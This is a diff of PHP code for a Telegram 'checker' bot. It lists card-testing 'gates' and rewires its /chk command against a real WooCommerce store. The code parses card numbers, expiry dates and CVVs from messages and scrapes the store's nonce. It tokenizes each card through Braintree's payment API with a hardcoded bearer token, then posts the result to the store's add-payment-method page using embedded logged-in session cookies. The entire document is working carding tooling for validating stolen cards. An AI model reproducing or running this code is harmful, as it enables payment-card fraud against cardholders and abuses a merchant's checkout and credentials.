@@ -897,13 +897,13 @@ elseif((strpos($message, "!gts") === 0)||(strpos($message, "/gts") === 0)||(strp
 }
 
 elseif((strpos($message, "!chds") === 0)||(strpos($message, "/chds") === 0)||(strpos($message, ".chds") === 0)) {
-        $respuesta = "𝘼𝙡𝙮𝙖 𝙎𝙖𝙣 ➟ Gates Chargeds\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n🔥 Braintree Charged ($50) ✔\n➣ Command ➟ /stp\n⁕Status: OFF!❌\n\n🔥 Braintree Charged ($5) ✔\n➣ Command ➟ /go\n⁕ Status: OFF!❌\n\n🔥 Charged (€1) ✔\n➣ Command ➟ /cb\n⁕ Status: ON!✅\n\n🔥 Charged ($5) ✔\n➣ Command ➟ /en\n⁕ Status: ON!✅\n\n🔥 Charged ($5) ✔\n➣ Command ➟ /br\n⁕ Status: ON!✅\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
+        $respuesta = "𝘼𝙡𝙮𝙖 𝙎𝙖𝙣 ➟ Gates Chargeds\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n🔥 Braintree Charged ($50) ✔\n➣ Command ➟ /stp\n⁕Status: OFF!❌\n\n🔥 Braintree Charged ($5) ✔\n➣ Command ➟ /go\n⁕ Status: ON!✅\n\n🔥 Charged (€1) ✔\n➣ Command ➟ /cb\n⁕ Status: ON!✅\n\n🔥 Charged ($5) ✔\n➣ Command ➟ /en\n⁕ Status: ON!✅\n\n🔥 Charged ($5) ✔\n➣ Command ➟ /br\n⁕ Status: ON!✅\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
         sendMessage($chat_id,$respuesta,$message_id);
 }
 
 elseif((strpos($message, "!ats") === 0)||(strpos($message, "/ats") === 0)||(strpos($message, ".ats") === 0)) {
         //$respuesta = "\n◤━━━━━ ☆ 𝙶𝙰𝚃𝙴𝚂 𝙰𝚄𝚃𝙷 ☆ ━━━━━◥\n\n🔥 Stripe Auth 3DS ✔\n➣ Checker ➟ !he\n⁕ Usage: !he ccs|month|year|cvv\n\n🔥 Stripe Auth ✔\n➣ Checker ➟ !ho\n⁕ Usage: !ho ccs|month|year|cvv\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
-        $respuesta = "𝘼𝙡𝙮𝙖 𝙎𝙖𝙣 ➟ Gates Auth\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n🔥 Braintree Auth ✔\n➣ Command ➟ /bt\n⁕ Status: OFF!❌\n\n🔥 Braintree Auth (Wa)✔\n➣ Command ➟ /tr\n⁕ Status: ON!✅\n\n🔥 Stripe 3D ✔\n➣ Command ➟ /ta\n⁕ Status: ON!✅\n\n🔥 Woo Stripe ✔\n➣ Command ➟ /wo\n⁕ Status: ON!✅\n\n🔥 Braintree_CCN ✔\n➣ Command ➟ /ho\n⁕ Status: ON!✅\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
+        $respuesta = "𝘼𝙡𝙮𝙖 𝙎𝙖𝙣 ➟ Gates Auth\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n🔥 Braintree Auth ✔\n➣ Command ➟ /chk\n⁕ Status: ON!✅\n\n🔥 Braintree Auth (Wa)✔\n➣ Command ➟ /tr\n⁕ Status: ON!✅\n\n🔥 Stripe 3D ✔\n➣ Command ➟ /ta\n⁕ Status: ON!✅\n\n🔥 Woo Stripe ✔\n➣ Command ➟ /wo\n⁕ Status: ON!✅\n\n🔥 Braintree_CCN ✔\n➣ Command ➟ /ho\n⁕ Status: ON!✅\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
         sendMessage($chat_id,$respuesta,$message_id);
 }
 
@@ -2657,8 +2657,8 @@ ob_flush();
 }
 
 
-elseif((strpos($message, "!bt") === 0)||(strpos($message, "/bt") === 0)||(strpos($message, ".bt") === 0)){
-$lista = substr($message, 4);
+elseif((strpos($message, "!chk") === 0)||(strpos($message, "/chk") === 0)||(strpos($message, ".chk") === 0)){
+$lista = substr($message, 5);
 $i = preg_split('/[|:| ]/', $lista);
 $cc    = $i[0];
 $mes   = $i[1];
@@ -2699,42 +2699,37 @@ $startTime = microtime(true); //TIEMPO DE INICIO
 $BinData = BinData($bin); //Extrae los datos del bin
 
 
+$bear = "eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDU4Nzg1NjcsImp0aSI6ImFhNjdiNzkzLWYxMTMtNDcxZS1hZGQxLTg0ZTc4ODhmMjg4MSIsInN1YiI6InN4cDkydHZodmZ6cWpkOXkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InN4cDkydHZodmZ6cWpkOXkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiZnN0b3BsbGNfaW5zdGFudCJ9fQ.MyJNFk_QQkUMGzAhhh1T2kRivovoLxg2KLTYZ9jGyuzLOXkg5zbFMmf7WIPnbwHoNxPkymyYJSEuk2B4jHJHfA";
 
 $curl = curl_init();
 curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://fstopgear.com/my-account/add-payment-method/',
+  CURLOPT_URL => 'https://fstopgear.com/my-account/add-payment-method/?currency=USD',
   CURLOPT_RETURNTRANSFER => true,
   CURLOPT_ENCODING => '',
   CURLOPT_MAXREDIRS => 10,
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'GET',
-  CURLOPT_COOKIE => 'ac_enable_tracking=1; __stripe_mid=cb6543e0-289b-4747-959a-773956e4b9e15eced5; yith_wcmcs_currency=USD; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-02-13%2000%3A49%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-02-13%2000%3A49%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; fp_logged_in_roles=customer; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36; __stripe_sid=d13a64db-6201-42d5-ad50-b698e01c4a8df73b5a; wp_woocommerce_session_92ff63d1ba7051ba8c3b940c6bfa0f68=16514%7C%7C1739580533%7C%7C1739576933%7C%7C7e3b7e0f9e2f940fd93e55bb2815d252; wordpress_logged_in_92ff63d1ba7051ba8c3b940c6bfa0f68=rigoj4847%7C1740620926%7CIJ5mqCvAEHrB3dMFSOAk8OKyoVviU1p0LPM7yLsiJoD%7C3d5cbc264de397b9aa525e3eb3dd86b0045c48cc8ea5fea104b8b20362af8977; sbjs_session=pgs%3D19%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fpayment-methods%2F',
+  CURLOPT_COOKIE => 'yith_wcmcs_currency=USD; ac_enable_tracking=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-04-27%2021%3A49%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-04-27%2021%3A49%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F135.0.0.0%20Mobile%20Safari%2F537.36; __stripe_mid=c25192ae-26d8-4ef9-9855-c3e29774db25e30c2e; __stripe_sid=8fb0213c-19f2-42ce-a5fc-5dac20a02da4d49ccc; fp_logged_in_roles=customer; wordpress_logged_in_92ff63d1ba7051ba8c3b940c6bfa0f68=wetejid917%7C1745963545%7Clbw57RtG6hGA4PBYC2zoSF5CtHNTR1N51ZEpSNceNm4%7C4154f22be94d3e6a85fa3614f72f433650fdc75ac36dbc783d097c48274bd5cc; sbjs_session=pgs%3D25%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fpayment-methods%2F%3Fcurrency%3DUSD',
   CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
     'sec-ch-ua-platform: "Android"',
     'accept-language: es-US,es;q=0.9',
-    'referer: https://fstopgear.com/my-account/payment-methods/',
+    'referer: https://fstopgear.com/my-account/payment-methods/?currency=USD',
   ],
 ]);
 
-
 $response = curl_exec($curl);
-$err = curl_error($curl);
-curl_close($curl);
 
-//file_put_contents('index.html', $response);
-//$response = file_get_contents('index.html');
+$err = curl_error($curl);
+file_put_contents('index.html', $response);
 $patron = '/name="woocommerce-add-payment-method-nonce" value="([^"]+)"/';
 preg_match($patron, $response, $coincidencias);
 $nonce = $coincidencias[1];
 echo "$nonce\n"; // Output: 5f49251774
-//file_put_contents('index.html', $response);
-////SACA EL TOKEN///
-
-
 
 $curl = curl_init();
+
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://payments.braintree-api.com/graphql',
   CURLOPT_RETURNTRANSFER => true,
@@ -2743,38 +2738,45 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"7abb52e8-83e7-460b-8125-24fd0202220f"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"10080","streetAddress":"6195 bollinger rd"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
+  CURLOPT_POSTFIELDS => '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"dc4ff119-23d7-40b8-afd0-cf5044966b35"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"10080","streetAddress":"6195 bollinger rd"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
   CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
+    'Accept-Encoding: gzip, deflate, br, zstd',
     'Content-Type: application/json',
     'sec-ch-ua-platform: "Android"',
-    'authorization: Bearer '.$authbear.'',
+    'authorization: Bearer '.$bear.'',
     'braintree-version: 2018-05-10',
+    'sec-ch-ua: "Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
+    'sec-ch-ua-mobile: ?1',
+    'sec-gpc: 1',
+    'accept-language: es-US,es;q=0.9',
     'origin: https://assets.braintreegateway.com',
+    'sec-fetch-site: cross-site',
+    'sec-fetch-mode: cors',
+    'sec-fetch-dest: empty',
     'referer: https://assets.braintreegateway.com/',
+    'priority: u=1, i',
   ],
 ]);
-
-$response = curl_exec($curl);
-$err = curl_error($curl);
-curl_close($curl);
-
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
 $json = json_decode($response, true);
 $id = $json["data"]["tokenizeCreditCard"]["token"];
 curl_close($curl);
+echo "$id\n";
 
-$cadena = 'payment_method=braintree_cc&braintree_cc_nonce_key='.$id.'&braintree_cc_device_data=%7B%22device_session_id%22%3A%229379db05be525e8836dd1b0c22a44bce%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%227abb52e8-83e7-460b-8125-24fd0202%22%7D&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Fsxp92tvhvfzqjd9y%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Fsxp92tvhvfzqjd9y%22%7D%2C%22merchantId%22%3A%22sxp92tvhvfzqjd9y%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22applePayWeb%22%3A%7B%22countryCode%22%3A%22US%22%2C%22currencyCode%22%3A%22USD%22%2C%22merchantIdentifier%22%3A%22sxp92tvhvfzqjd9y%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%2C%22discover%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22Discover%22%2C%22JCB%22%2C%22MasterCard%22%2C%22Visa%22%2C%22American+Express%22%2C%22UnionPay%22%5D%7D%2C%22threeDSecureEnabled%22%3Afalse%2C%22threeDSecure%22%3Anull%2C%22androidPay%22%3A%7B%22displayName%22%3A%22f-stop+LLC%22%2C%22enabled%22%3Atrue%2C%22environment%22%3A%22production%22%2C%22googleAuthorizationFingerprint%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mzk0OTc2NzQsImp0aSI6IjU4NzU0OTQ2LTgyZTktNGZkOC1hYTE4LTY2M2NhMDNiMmRiYyIsInN1YiI6InN4cDkydHZodmZ6cWpkOXkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InN4cDkydHZodmZ6cWpkOXkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.Gz3qoySfPS_aFEHZouPDYytHiC_QWV9YynD61IErmUjCvldtUMK0xEHbURzUrSsn9emMTzLdMN2a4ECsLeGWhQ%22%2C%22paypalClientId%22%3A%22AbRISQxzl3KPhfX0pGGBRibYHMj92QWlu58vnESp9A6VVb3qIG7DFUlI9Lw7bcuAkIkKbpvusTM50nZ6%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%2C%22discover%22%5D%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22f-stop+LLC%22%2C%22clientId%22%3A%22AbRISQxzl3KPhfX0pGGBRibYHMj92QWlu58vnESp9A6VVb3qIG7DFUlI9Lw7bcuAkIkKbpvusTM50nZ6%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22fstopllc_instant%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22USD%22%7D%7D&woocommerce-add-payment-method-nonce=NONCE1&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1';
+
+
+$cadena = 'payment_method=braintree_cc&braintree_cc_nonce_key='.$id.'&braintree_cc_device_data={"device_session_id":"7f568c81eb739c776e9ac8d6652a2a0a","fraud_merchant_id":null,"correlation_id":"dc4ff119-23d7-40b8-afd0-cf504496"}&braintree_cc_3ds_nonce_key=&braintree_cc_config_data={"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/sxp92tvhvfzqjd9y/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/sxp92tvhvfzqjd9y"},"merchantId":"sxp92tvhvfzqjd9y","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"sxp92tvhvfzqjd9y","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"f-stop LLC","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDU4Nzc0MjQsImp0aSI6ImJiNmZjNDA4LWU1MDQtNDczMS1hNGQzLWUzYmI2YzQwOGM3ZSIsInN1YiI6InN4cDkydHZodmZ6cWpkOXkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InN4cDkydHZodmZ6cWpkOXkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.r6yRsATfIKxvG6x_9PZVS9MPFul1Huo-b_GFL3OdlDFvCqVvbHGQuT8Qck1YY1nyEsdKA8L-Y7efq9LXM5l5nQ","paypalClientId":"AbRISQxzl3KPhfX0pGGBRibYHMj92QWlu58vnESp9A6VVb3qIG7DFUlI9Lw7bcuAkIkKbpvusTM50nZ6","supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"f-stop LLC","clientId":"AbRISQxzl3KPhfX0pGGBRibYHMj92QWlu58vnESp9A6VVb3qIG7DFUlI9Lw7bcuAkIkKbpvusTM50nZ6","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"fstopllc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}&woocommerce-add-payment-method-nonce=NONCE1&_wp_http_referer=/my-account/add-payment-method/?currency=USD&woocommerce_add_payment_method=1';
+
 $data = str_replace('NONCE1', $nonce, $cadena);
 
 ///HACE LA COMPRA///
 
-
 $curl = curl_init();
 curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://fstopgear.com/my-account/add-payment-method/',
+  CURLOPT_URL => 'https://fstopgear.com/my-account/add-payment-method/?currency=USD',
   CURLOPT_RETURNTRANSFER => true,
   CURLOPT_ENCODING => '',
   CURLOPT_MAXREDIRS => 10,
@@ -2782,16 +2784,18 @@ curl_setopt_array($curl, [
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
   CURLOPT_POSTFIELDS => $data,
-  CURLOPT_COOKIE => 'ac_enable_tracking=1; __stripe_mid=cb6543e0-289b-4747-959a-773956e4b9e15eced5; yith_wcmcs_currency=USD; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-02-13%2000%3A49%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-02-13%2000%3A49%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; fp_logged_in_roles=customer; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36; __stripe_sid=d13a64db-6201-42d5-ad50-b698e01c4a8df73b5a; wp_woocommerce_session_92ff63d1ba7051ba8c3b940c6bfa0f68=16514%7C%7C1739580533%7C%7C1739576933%7C%7C7e3b7e0f9e2f940fd93e55bb2815d252; wordpress_logged_in_92ff63d1ba7051ba8c3b940c6bfa0f68=rigoj4847%7C1740620926%7CIJ5mqCvAEHrB3dMFSOAk8OKyoVviU1p0LPM7yLsiJoD%7C3d5cbc264de397b9aa525e3eb3dd86b0045c48cc8ea5fea104b8b20362af8977; sbjs_session=pgs%3D20%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fadd-payment-method%2F',
+  CURLOPT_COOKIE => 'yith_wcmcs_currency=USD; ac_enable_tracking=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-04-27%2021%3A49%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-04-27%2021%3A49%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F135.0.0.0%20Mobile%20Safari%2F537.36; __stripe_mid=c25192ae-26d8-4ef9-9855-c3e29774db25e30c2e; __stripe_sid=8fb0213c-19f2-42ce-a5fc-5dac20a02da4d49ccc; fp_logged_in_roles=customer; wordpress_logged_in_92ff63d1ba7051ba8c3b940c6bfa0f68=wetejid917%7C1745963545%7Clbw57RtG6hGA4PBYC2zoSF5CtHNTR1N51ZEpSNceNm4%7C4154f22be94d3e6a85fa3614f72f433650fdc75ac36dbc783d097c48274bd5cc; sbjs_session=pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fadd-payment-method%2F%3Fcurrency%3DUSD',
   CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
     'Content-Type: application/x-www-form-urlencoded',
     'sec-ch-ua-platform: "Android"',
     'origin: https://fstopgear.com',
     'accept-language: es-US,es;q=0.9',
-    'referer: https://fstopgear.com/my-account/add-payment-method/',
+    'referer: https://fstopgear.com/my-account/add-payment-method/?currency=USD',
+    'priority: u=0, i',
   ],
 ]);
+
 
